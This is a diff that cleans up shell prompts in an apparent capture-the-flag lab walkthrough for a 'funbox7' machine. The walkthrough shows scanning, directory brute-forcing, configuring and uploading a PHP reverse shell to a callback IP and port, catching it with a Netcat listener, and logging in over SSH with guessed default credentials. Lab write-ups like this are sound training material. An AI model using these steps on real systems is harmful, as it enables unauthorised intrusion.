@@ -7,8 +7,7 @@ Nmap
 
 We’ll begin with a simple nmap scan.
 
-┌──(kali㉿kali)-[~]
-└─$ sudo nmap 192.168.120.148     
+sudo nmap 192.168.120.148     
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 10:27 EST
 Nmap scan report for 192.168.120.148
 Host is up (0.036s latency).
@@ -22,7 +21,7 @@ GoBuster
 
 Next, we’ll try brute-forcing the web server’s hidden files and directories with the /usr/share/dirb/wordlists/common.txt wordlist, searching for PHP, text, and HTML files.
 
-(kali㉿kali)-[~] └─$ gobuster dir -u http://192.168.120.148 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html
+(kali㉿kali)-[~] $ gobuster dir -u http://192.168.120.148 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html
 
 ===============================================================
 Gobuster v3.0.1
@@ -41,17 +40,13 @@ File Upload Vulnerability
 
 This page may allow uploads to the web root (/var/www/html/). Since the PHP file format seems to be supported, let’s try uploading a PHP reverse shell. We’ll update the IP address and port number as needed.
 
-┌──(kali㉿kali)-[~]
-└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
+cp /usr/share/webshells/php/php-reverse-shell.php .
                                                                                                                               
-┌──(kali㉿kali)-[~]
-└─$ sed -i "s/$ip = '127.0.0.1';/$ip = '192.168.118.5';/g" php-reverse-shell.php                            
+sed -i "s/$ip = '127.0.0.1';/$ip = '192.168.118.5';/g" php-reverse-shell.php                            
                                                                                                                               
-┌──(kali㉿kali)-[~]
-└─$ sed -i "s/$port = 1234;/$port = 4444;/g" php-reverse-shell.php
+sed -i "s/$port = 1234;/$port = 4444;/g" php-reverse-shell.php
                                                                                                                               
-┌──(kali㉿kali)-[~]
-└─$
+
 
 Next, we’ll click Browse, select our reverse shell file, and click upload. Once uploaded, the file appears in the web root directory listing. Let’s start a Netcat listener on port 4444 and trigger our shell by navigating to http://192.168.120.148/php-reverse-shell.php.
 
@@ -63,8 +58,7 @@ Successfully opened reverse shell to 192.168.118.5:4444
 
 Our Netcat listener presents us with a shell as the www-data user.
 
-┌──(kali㉿kali)-[~]
-└─$ nc -nlvp 4444
+nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [192.168.118.5] from (UNKNOWN) [192.168.120.148] 34362
 Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -115,8 +109,7 @@ sally:sally
 
 One of the credential pairs (goat:goat) works!
 
-┌──(kali㉿kali)-[~]
-└─$ ssh goat@192.168.120.148
+ssh goat@192.168.120.148
 goat@192.168.120.148's password: 
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-117-generic x86_64)
 ...
